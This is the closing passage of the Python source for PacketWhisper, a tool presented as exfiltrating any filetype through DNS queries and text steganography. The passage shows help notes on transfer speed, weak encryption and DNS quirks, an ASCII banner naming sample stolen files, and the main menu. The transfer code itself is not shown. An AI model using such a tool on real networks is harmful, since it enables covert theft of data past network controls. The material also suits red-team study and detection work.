	print(" Always verify your PCAP capture settings and outputs.")
	print("")
	print("=====  NOTE: NOT A HIGH-BANDWIDTH TRANSFER METHOD  =====")
	print("")
	print("Not a high-bandwidth transfer method. PacketWhisper relies on DNS queries,")
	print("which are UDP-based, meaning order of delivery (or even successful delivery)")
	print("of the request is not guranteed. For this reason, PacketWhisper by default")
	print("adds a small (half-second) delay between each DNS query. This will safely")
	print("transfer payloads at a rate of about 7.2K per hour (120 bytes per minute)")
	print("based on the size of the original payload, not the Cloakified output file.")
	print("")
	print("You can opt for no delay between between queries, which dramatically speeds")
	print("up the transfer but at the risk of increased network noise and corrupted payload.")
	print("")
	print("If you have other datapaths available (HTTP outbound, etc.) then just use")
	print("the Cloakify project (GitHub project URL above) and its standard ciphers,")
	print("transfer normally.")
	print("")
	print("=====  NOTE: NOT A SECURE ENCRYPTION SCHEME  =====")
	print("")
	print("PacketWhisper is not a secure encryption scheme. It's vulnerable to")
	print("frequency analysis attacks. Use the 'Unique Random Subdomain FQDNs'")
	print("category of ciphers to add entropy and help degrade frequency analysis")
	print("attacks. If payload secrecy is required, be sure to encrypt the payload")
	print("before using PacketWhisper to process it.")
	print("")
	print("=====  NOTE: DNS IS DNS  =====")
	print("")
	print("Different OS's have different DNS caching policies, etc. Networks may be")
	print("down, isolated, etc. PacketWhisper includes a quick manual check to see if")
	print("it can resolve common FQDNs, but DNS is often a messy business. Remember")
	print("the old IT troubleshooting mantra: 'It's always DNS.'")

	ModeHelp()

	return()


#========================================================================
#
# PrintBanner()
#
# It just wouldn't be a proper tool without an ASCII splash screen.
#
#========================================================================

def PrintBanner():

	print("  _____           _        ___          ___     _                      ")
	print(" |  __ \         | |      | \ \        / / |   (_)                     ")
	print(" | |__) |_ _  ___| | _____| |\ \  /\  / /| |__  _ ___ _ __   ___ _ __  ")
	print(" |  ___/ _` |/ __| |/ / _ \ __\ \/  \/ / | '_ \| / __| '_ \ / _ \ '__| ")
	print(" | |  | (_| | (__|   <  __/ |_ \  /\  /  | | | | \__ \ |_) |  __/ |    ")
	print(" |_|   \__,_|\___|_|\_\___|\__| \/  \/   |_| |_|_|___/ .__/ \___|_|    ")
	print("                                                     | |               ")
	print("                                                     |_|               ")
	print("")
	print("           Exfiltrate / Transfer Any Filetype in Plain Sight")
	print("                                  via                 ")
	print("                 Text-Based Steganograhy & DNS Queries")
	print("\"SHHHHHHHHHH!\"")
	print("        \                Written by TryCatchHCF")
	print("         \           https://github.com/TryCatchHCF")
	print("  (\~---.")
	print("  /   (\-`-/)")
	print(" (      ' '  )        data.xls accounts.txt \\     Series of ")
	print("  \ (  \_Y_/\\        device.cfg  backup.zip  -->  harmless-looking ")
	print("   \"\"\ \___//         LoadMe.war file.doc   /     DNS queries ")
	print("      `w   \"")

	return


#========================================================================
#
# MainMenu()
#
#========================================================================

def MainMenu():

	PrintBanner()

	selectionErrorMsg = "1-5 are your options. Try again."
	notDone = 1

	while ( notDone ):

		print("")
		print("====  PacketWhisper Main Menu  ====")
		print("")
		print("1) Transmit File via DNS")
		print("2) Extract File from PCAP")
		print("3) Test DNS Access")
		print("4) Help / About")
		print("5) Exit")
		print("")

		invalidSelection = 1

		while ( invalidSelection ):
			try:
				choice = int( input( "Selection: " ))

				if ( choice > 0 and choice < 6 ):
					invalidSelection = 0
				else:
					print(selectionErrorMsg)

			except ValueError:
				print(selectionErrorMsg)

		if choice == 1:
			CloakAndTransferFile()
		elif choice == 2:
			ExtractCapturedPayload()
		elif choice == 3:
			TestDNSAccess()
		elif choice == 4:
			Help()
		elif choice == 5:
			notDone = 0
		else:
			print(selectionErrorMsg)

	# Wherever you are on this floating space orb we call home, I hope you are well

	byeArray = ("Bye!", "Ciao!", "Adios!", "Aloha!", "Hei hei!", "Bless bless!", "Hej da!", "Tschuss!", "Adieu!", "Cheers!")

	print("")
	print(random.choice( byeArray ))
	print("")


# ==============================  Main Loop  ================================
#
MainMenu()
